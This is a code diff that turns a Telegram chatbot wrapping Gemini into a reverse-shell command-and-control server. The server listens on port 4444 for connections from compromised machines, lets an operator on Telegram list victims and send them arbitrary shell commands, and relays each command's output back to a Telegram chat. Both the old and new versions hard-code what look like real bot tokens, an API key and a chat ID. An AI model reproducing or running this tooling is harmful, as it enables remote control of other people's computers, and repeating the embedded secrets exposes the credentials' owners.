@@ -1,37 +1,103 @@
-import telebot
-import google.generativeai as genai
+import socket
+import threading
+import requests
 
-# Telegram and Gemini API keys
-TELEGRAM_TOKEN = "7333847070:AAFUwJpWNvTZTQLVIsbcCicJZlWAmqFFNa4"
-GEMINI_API_KEY = "AIzaSyCWFRHQ3B9A-wERY9QbggKWHffLeHkAuzg"
+# Telegram Bot Configuration
+BOT_TOKEN = "7341952786:AAErBcgGblJyjBpadb483rHyPdEBDjeeTfA"
+CHAT_ID = "7416312733"
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
-# Initialize the Telegram Bot
-bot = telebot.TeleBot(TELEGRAM_TOKEN)
+# Listener Configuration
+HOST = '0.0.0.0'  # Listen on all interfaces
+PORT = 4444       # Port for reverse shell connections
 
-# Configure Google Gemini AI
-genai.configure(api_key=GEMINI_API_KEY)
-model = genai.GenerativeModel("gemini-1.5-flash")
+# Global dictionary to track connected clients
+clients = {}
 
-# Function to generate a more explicit adult response in Hinglish
-def generate_adult_response(user_input):
+# Send a message to Telegram
+def send_telegram_message(message):
+    payload = {'chat_id': CHAT_ID, 'text': message}
     try:
-        response = model.generate_content(f"Respond ethical hacking teacher and programmer in Hinglish. The user said: {user_input}")
-        return response.text.strip()
+        requests.post(TELEGRAM_API_URL, data=payload)
     except Exception as e:
-        return f"Sorry baby, I can't fulfill that request right now. 😘"
+        print(f"Error sending Telegram message: {e}")
 
-# Start Command: Start conversation with the bot
-@bot.message_handler(commands=["start"])
-def start(message):
-    bot.reply_to(message, "Hi there!😊")
+# Handle commands received from Telegram
+def handle_telegram_commands():
+    last_update_id = None
+    while True:
+        try:
+            updates_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id}"
+            response = requests.get(updates_url).json()
 
-# Default Message Handler: Respond to user input with adult Hinglish response
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
-    user_input = message.text
-    response = generate_adult_response(user_input)
-    bot.reply_to(message, response)
+            for update in response.get('result', []):
+                last_update_id = update['update_id'] + 1
+                message_text = update['message']['text'].strip().lower()
+                user_name = update['message']['from']['first_name']
 
-# Run the bot
+                if message_text == "/start":
+                    send_telegram_message(f"Hi {user_name}, the server is ready!")
+                elif message_text.startswith("list"):
+                    # List all connected clients
+                    active_clients = "\n".join([f"{id}: {addr}" for id, addr in clients.items()])
+                    send_telegram_message(f"Active Clients:\n{active_clients}")
+                elif message_text.startswith("control"):
+                    # Example: control 1 ls
+                    try:
+                        _, client_id, command = message_text.split(" ", 2)
+                        client_id = int(client_id)
+                        if client_id in clients:
+                            target_conn = clients[client_id][0]
+                            target_conn.send(command.encode())
+                            output = target_conn.recv(4096).decode()
+                            send_telegram_message(f"Output from client {client_id}:\n{output}")
+                        else:
+                            send_telegram_message("Invalid client ID.")
+                    except Exception as e:
+                        send_telegram_message(f"Error processing control command: {e}")
+                elif message_text == "exit":
+                    send_telegram_message("Shutting down server...")
+                    exit(0)
+                else:
+                    send_telegram_message("Invalid command. Use /start, list, or control.")
+        except Exception as e:
+            print(f"Error handling Telegram commands: {e}")
+            send_telegram_message(f"Error: {e}")
+
+# Handle each client connection
+def handle_client(client_socket, client_address, client_id):
+    clients[client_id] = (client_socket, client_address)
+    send_telegram_message(f"New client connected: {client_id} from {client_address}")
+    try:
+        while True:
+            data = client_socket.recv(1024)
+            if not data:
+                break
+    except Exception as e:
+        print(f"Client {client_id} disconnected: {e}")
+    finally:
+        client_socket.close()
+        del clients[client_id]
+        send_telegram_message(f"Client {client_id} disconnected.")
+
+# Start the listener for reverse shell connections
+def start_listener():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((HOST, PORT))
+    server.listen(5)
+    send_telegram_message(f"Server started on {HOST}:{PORT}.")
+    print(f"Listening on {HOST}:{PORT}...")
+
+    client_id = 0
+    while True:
+        client_socket, client_address = server.accept()
+        client_id += 1
+        threading.Thread(target=handle_client, args=(client_socket, client_address, client_id), daemon=True).start()
+
+# Main function to start the server and Telegram bot handler
+def main():
+    threading.Thread(target=start_listener, daemon=True).start()
+    handle_telegram_commands()
+
 if __name__ == "__main__":
-    bot.polling()
+    main()
